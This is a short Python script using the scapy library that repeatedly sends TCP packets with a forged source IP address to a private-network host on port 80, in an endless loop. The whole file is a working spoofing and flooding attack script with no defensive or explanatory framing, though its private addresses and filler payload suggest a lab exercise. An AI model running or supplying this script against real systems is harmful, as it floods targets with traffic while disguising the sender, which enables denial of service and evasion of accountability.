#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Created on Mon Jan 31 21:51:52 2022

@author: tushar
"""

from scapy.all import *

A = "192.168.1.254" # spoofed source IP address
B = "192.168.1.105" # destination IP address
C = RandShort() # source port
D = 80 # destination port
payload = "Hello Hello Hello" # packet payload

while True:
    spoofed_packet = IP(src=A, dst=B) / TCP(sport=C, dport=D) / payload
    send(spoofed_packet)